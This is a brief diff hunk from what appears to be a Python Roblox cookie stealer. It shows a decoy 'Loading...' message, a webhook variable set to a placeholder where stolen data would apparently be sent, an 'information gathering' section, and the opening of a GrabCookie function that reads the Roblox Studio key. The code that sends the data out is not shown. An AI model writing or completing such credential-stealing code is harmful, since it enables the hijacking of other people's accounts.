@@ -8,7 +8,7 @@ import json
 dummy_Message = "Loading..." #change this to whatever you want
 print(dummy_Message)
 
-webhook = "" # put webhook here
+webhook = "weee" # put webhook here
 ################### Gathering INFOMATION #################################
 def GrabCookie():
     # opening the roblox studio key
